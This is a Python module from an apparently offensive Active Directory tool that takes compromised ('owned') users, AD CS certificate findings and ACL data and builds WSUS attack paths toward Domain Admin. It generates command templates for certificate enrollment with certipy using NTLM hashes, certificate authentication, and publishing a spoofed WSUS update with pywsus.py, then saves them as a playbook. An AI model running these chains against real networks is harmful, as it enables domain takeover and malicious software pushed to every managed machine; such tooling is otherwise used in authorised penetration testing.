from __future__ import annotations

import json
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING, Any

from admapper.creds.common import pick_dc_ip
from admapper.guides.render import print_manual_guide
from admapper.models.wsus_op import WsusOpportunity
from admapper.support.output import print_info, print_success, print_table, print_warning
from admapper.wsus.catalog import wsus_meta
from admapper.wsus.prerequisites import (
    WsusPrerequisite,
    check_wsus_prerequisites,
    owned_groups_for_user,
)

if TYPE_CHECKING:
    from admapper.support.session import Session


def _load_json(path) -> dict[str, Any] | None:
    if not path.is_file():
        return None
    return json.loads(path.read_text(encoding="utf-8"))


def _owned_users(session: Session) -> list[str]:
    if session.workspace is None:
        return []
    return list(session.workspace.owned_users)


def _opportunity(
    technique: str,
    *,
    target_host: str,
    context: str | None = None,
    detail: str = "",
    prerequisites: list[WsusPrerequisite] | None = None,
) -> WsusOpportunity:
    meta = wsus_meta(technique)
    prereqs = prerequisites or []
    met = all(p.met for p in prereqs) if prereqs else True
    return WsusOpportunity(
        technique=technique,
        title=meta.title,
        severity=meta.severity if met else "medium",
        mitre_id=meta.mitre_id,
        summary=meta.summary,
        target_host=target_host,
        context=context,
        detail=detail,
        manual_commands=list(meta.manual_commands),
        prerequisites_met=met,
        prerequisites=[p.to_dict() for p in prereqs],
    )


def _template_enrollment_for_owned(
    adcs_findings: dict[str, Any] | None,
    owned: set[str],
) -> list[dict[str, Any]]:
    hits: list[dict[str, Any]] = []
    for finding in (adcs_findings or {}).get("findings") or []:
        esc = str(finding.get("esc") or "")
        principal = str(finding.get("principal") or "").lower()
        if esc not in ("template_enrollment", "esc4", "esc1") or principal not in owned:
            continue
        hits.append(finding)
    return hits


def _detect_wsus_share(
    inventory: dict[str, Any] | None,
    ws_path: Path | None = None,
) -> bool:
    shares: set[str] = set()
    for share in (inventory or {}).get("smb_shares") or []:
        shares.add(str(share).upper())
    if ws_path is not None:
        for name in ("technical_report.json", "evidence_export.json"):
            path = ws_path / name
            if not path.is_file():
                continue
            try:
                blob = path.read_text(encoding="utf-8").lower()
            except OSError:
                continue
            if "wsustemp" in blob:
                return True
    return "WSUSTEMP" in shares


def build_wsus_opportunities(
    session: Session,
    *,
    inventory: dict[str, Any] | None,
    adcs_inventory: dict[str, Any] | None,
    adcs_findings: dict[str, Any] | None,
    acl_data: dict[str, Any] | None,
    dc_ip: str | None,
    ws_path: Path | None = None,
) -> list[WsusOpportunity]:
    """Build WSUS opportunities gated on owned users, AD CS, and group membership."""
    ops: list[WsusOpportunity] = []
    owned_list = _owned_users(session)
    owned = {u.lower() for u in owned_list}
    target = dc_ip or pick_dc_ip(session) or "<DC>"

    if not owned:
        return ops

    has_adcs = bool((adcs_inventory or {}).get("enrollment_services"))
    enroll_findings = _template_enrollment_for_owned(adcs_findings, owned)
    wsus_share = _detect_wsus_share(inventory, ws_path)

    for username in owned_list:
        if username.endswith("$"):
            continue
        groups = owned_groups_for_user(inventory, username)
        prereqs = check_wsus_prerequisites(
            username=username,
            groups=groups,
            has_adcs=has_adcs,
            wsus_share=wsus_share,
            enroll_findings=enroll_findings,
            acl_findings=(acl_data or {}).get("findings") or [],
        )

        # Always suggest WSUS enum when AD CS + owned user present
        if has_adcs:
            ops.append(
                _opportunity(
                    "wsus_admin_enum",
                    target_host=target,
                    context=username,
                    detail="Check WSUS Administrators membership and ACL abuse paths",
                    prerequisites=[p for p in prereqs if p.key in ("owned_user", "adcs_present")],
                )
            )

        # WSUS + cert chain when enrollment finding exists for this user
        user_enroll = [
            f for f in enroll_findings if str(f.get("principal", "")).lower() == username.lower()
        ]
        if user_enroll and has_adcs:
            template = str(user_enroll[0].get("template") or "<Template>")
            ca = str(user_enroll[0].get("ca_name") or "<CA>")
            wsus_only = bool(user_enroll[0].get("wsus_chain_step"))
            chain_prereqs = check_wsus_prerequisites(
                username=username,
                groups=groups,
                has_adcs=True,
                wsus_share=wsus_share,
                enroll_findings=user_enroll,
                acl_findings=(acl_data or {}).get("findings") or [],
                require_enrollment=True,
            )
            detail = f"Enroll {template} as {username} (IT), then WSUS spoofing toward DA" + (
                " — Server Auth only, no cert login" if wsus_only else ""
            )
            op = _opportunity(
                "wsus_cert_chain",
                target_host=target,
                context=username,
                detail=detail,
                prerequisites=chain_prereqs,
            )
            op.manual_commands = [
                f"certipy req -u {username}@<domain> -hashes :<NTLM> -ca {ca} "
                f"-template {template} -dns <wsus_fqdn>",
            ]
            if wsus_only:
                op.manual_commands.extend(
                    [
                        "# No Client Authentication EKU — certipy auth will not work",
                        "admapper postex run --mode enroll  # or run enrollment script on target shell",
                        "python3 pywsus.py -s <wsus_host> publish ...",
                    ]
                )
            else:
                op.manual_commands.extend(
                    [
                        "certipy auth -pfx <host>.pfx -dc-ip <DC>",
                        "python3 pywsus.py -u '<host>$'@<domain> -hashes :<NTLM> -s <wsus_host> publish ...",
                    ]
                )
            ops.append(op)

        # Direct WSUS spoof if user is WSUS admin or ACL grants AddMember
        wsus_admin = "WSUS Administrators" in groups or any(
            str(f.get("right")) in ("addmember", "genericall", "genericwrite")
            and "wsus" in str(f.get("target_name", "")).lower()
            for f in (acl_data or {}).get("findings") or []
            if str(f.get("principal", "")).lower() == username.lower()
        )
        if wsus_admin or (wsus_share and "IT" in groups):
            spoof_prereqs = check_wsus_prerequisites(
                username=username,
                groups=groups,
                has_adcs=has_adcs,
                wsus_share=wsus_share,
                enroll_findings=enroll_findings,
                acl_findings=(acl_data or {}).get("findings") or [],
                require_wsus_path=True,
            )
            ops.append(
                _opportunity(
                    "wsus_spoof",
                    target_host=target,
                    context=username,
                    detail="WSUS Administrators or IT group + WSUSTemp share — spoof signed update",
                    prerequisites=spoof_prereqs,
                )
            )

    seen: set[tuple[str, str, str | None]] = set()
    unique: list[WsusOpportunity] = []
    for op in ops:
        key = (op.technique, op.target_host, op.context)
        if key in seen:
            continue
        seen.add(key)
        unique.append(op)
    return unique


@dataclass
class WsusAnalysisResult:
    opportunities: list[WsusOpportunity] = field(default_factory=list)
    output_path: str | None = None


def run_wsus_analysis(session: Session) -> WsusAnalysisResult:
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    domain = session.workspace.domain
    if not domain:
        raise ValueError("set domain <fqdn> before wsus")

    ws_path = session.workspaces.path_for(session.workspace.name)
    dc_ip = pick_dc_ip(session)

    print_info("WSUS — analyze prerequisites and attack paths")

    from admapper.adcs.enrich import enrich_adcs_findings_file

    enrich_adcs_findings_file(ws_path)

    inventory = _load_json(ws_path / "auth_inventory.json")
    adcs_inv = _load_json(ws_path / "adcs_inventory.json")
    adcs_find = _load_json(ws_path / "adcs_findings.json")
    acl_data = _load_json(ws_path / "acl_findings.json")

    if not _owned_users(session):
        print_warning("no owned users — WSUS chain requires compromised principal")

    if not adcs_inv:
        print_warning("no adcs_inventory.json — run adcs first for cert template intel")

    opportunities = build_wsus_opportunities(
        session,
        inventory=inventory,
        adcs_inventory=adcs_inv,
        adcs_findings=adcs_find,
        acl_data=acl_data,
        dc_ip=dc_ip,
        ws_path=ws_path,
    )
    for idx, op in enumerate(opportunities, start=1):
        op.id = f"wsus-{idx:03d}"

    out_path = ws_path / "wsus_ops.json"
    out_path.write_text(
        json.dumps(
            {
                "domain": domain,
                "owned_users": _owned_users(session),
                "opportunity_count": len(opportunities),
                "opportunities": [o.to_dict() for o in opportunities],
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )

    if opportunities:
        rows = [
            [
                o.id,
                o.technique,
                "yes" if o.prerequisites_met else "no",
                o.context or "",
                o.severity,
            ]
            for o in opportunities[:20]
        ]
        print_table(
            "WSUS opportunities",
            ["id", "technique", "ready", "context", "severity"],
            rows,
        )
    else:
        print_warning("no WSUS opportunities — need owned user + AD CS intel")

    print_success("WSUS playbook saved → wsus_ops.json")
    print_manual_guide("wsus_esc", session=session)
    return WsusAnalysisResult(opportunities=opportunities, output_path=str(out_path))


def get_wsus_op(session: Session, op_id: str) -> dict[str, Any] | None:
    if session.workspace is None:
        raise RuntimeError("no active workspace")
    path = session.workspaces.path_for(session.workspace.name) / "wsus_ops.json"
    if not path.is_file():
        return None
    data = json.loads(path.read_text(encoding="utf-8"))
    for item in data.get("opportunities", []):
        if str(item.get("id")) == op_id:
            return item
    return None
